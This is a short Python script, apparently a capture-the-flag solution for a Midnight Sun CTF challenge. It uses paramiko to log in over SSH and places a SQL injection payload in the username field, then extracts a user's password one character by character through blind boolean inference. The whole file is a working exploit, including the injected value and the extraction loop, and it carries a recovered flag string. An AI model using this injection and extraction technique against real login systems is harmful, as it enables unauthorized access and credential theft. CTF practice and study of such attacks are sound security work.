#!/usr/bin/env python
import paramiko

port = 2222
host = 'fsociety-01.play.midnightsunctf.se'

username = "' or username='elliot' and password COLLATE utf8mb4_bin like '{}%' COLLATE utf8mb4_bin  #"

password_chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz{}0123456789-'

client = paramiko.SSHClient()
client.load_system_host_keys()

best_guess = 'midnight{BA053FFB-CC3C-4AB7-9A85-15A594CC43E9}'
best_guess = ''

for i in range(46):
    for c in password_chars:

        current_guess = best_guess + c

        print(f'{current_guess=}')

        try:
            client.connect(host, port=port, username=username.format(current_guess), password='doesntmatter', look_for_keys=False)
            stdin, stdout, stderr = client.exec_command('ls -l')
        except paramiko.ssh_exception.AuthenticationException:
            pass
        else:
            best_guess += c
            break
    else:
        print('didn\'t find a suitable character')
        break
